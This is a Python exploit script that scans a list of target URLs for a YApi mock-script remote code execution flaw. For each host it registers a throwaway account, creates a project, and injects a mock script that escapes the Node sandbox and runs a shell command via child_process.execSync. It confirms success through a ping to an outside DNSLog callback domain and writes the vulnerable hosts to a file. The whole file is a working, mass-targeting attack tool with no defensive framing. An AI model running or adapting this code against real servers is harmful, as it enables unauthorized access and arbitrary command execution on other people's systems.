import requests
import json
import random
import string
import uuid
import os

if(not os.path.exists("target.txt")):
    exit("put url in target.txt! ")

dnslogdomain = requests.get("https://dns.xn--9tr.com/new_gen").text
if(len(dnslogdomain.split(".")[0])!=8):
    exit("Maybe `dns.xn--9tr.com` is down..")
print("[!] Your DnsLog Domain Is `{0}`".format(dnslogdomain))
dnslogresurl = "https://dns.xn--9tr.com/"+dnslogdomain.split(".")[0]
with open("target.txt")as f:
    urls = f.readlines()
uuids={}
print("\n")
print(" payload发送开始 ".center(50,"-"))
for url in urls:
    url = url.strip()
    if("://" not in url):
        url  = "http://"+url
    uid = uuid.uuid1().hex
    uuids[url]=uid
    cmd = "ping {0}.{1} -c1".format(uid,dnslogdomain)
    #print(cmd)
    id = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    try:
        header = {
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        data = {
            "email":id+"@gmail.com",
            "password":id,
            "username":id
        }
        reg = requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data))
        print(reg.json())
        if(reg.json()['errcode']==0):
            print("注册成功")
        else:
            continue
        login = requests.post(url+"/api/user/login",headers=header,timeout=5,data=json.dumps(data))

        print(login.json())
        if(login.json()['errcode']==0):
            print("登录成功")
        else:
            continue
        header['Cookie'] = login.headers['Set-Cookie'].split(";")[0]+"; _yapi_uid="+str(login.json()['data']['uid'])
        #print(requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data)).json())
        group_id = requests.get(url+"/api/group/list",headers=header,timeout=5).json()['data'][0]['_id']
        #print("当前用户组")
        #print(group_id)
        data = {
            "name":id,"group_id":group_id,"icon":"code-o","color":"pink","project_type":"private"
        }
        projid = requests.post(url+"/api/project/add",headers=header,timeout=5,data=json.dumps(data)).json()['data']['_id']
        #print("当前项目")
        #print(projid)
        data = {
            "id":projid,"project_mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockjson = process.mainModule.require(\"child_process\").execSync(\""+cmd+"\").toString()","is_mock_open":True
        }
        up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
        #print(up)
        catid = requests.get(url+"/api/interface/list_menu?project_id="+str(projid),headers=header,timeout=5).json()['data'][0]['_id']
        #print(catid)
        data = {"method":"GET","catid":catid,"title":id,"path":"/"+id,"project_id":projid}
        api = requests.post(url+"/api/interface/add",headers=header,timeout=5,data=json.dumps(data)).json()
        #print(api)
        print(url+"/mock/"+str(projid)+"/"+id)
        requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5)
    except:
        pass
print(" payload发送完毕 ".center(50,"-"))
print("\n")
print("---".center(50,"-"))
success=[]
res = requests.get(dnslogresurl).text
for target in uuids:
    if(uuids[target] in res):
        print("[+] {0} 漏洞存在".format(target))
        success.append(target)
    else:
        print("[!] {0} 漏洞不存在".format(target))
print("---".center(50,"-"))
filename = uuid.uuid1().hex+".txt"
with open(filename,"w") as f:
    f.write("\n".join(success))
    print("[*] put res in {0}".format(filename))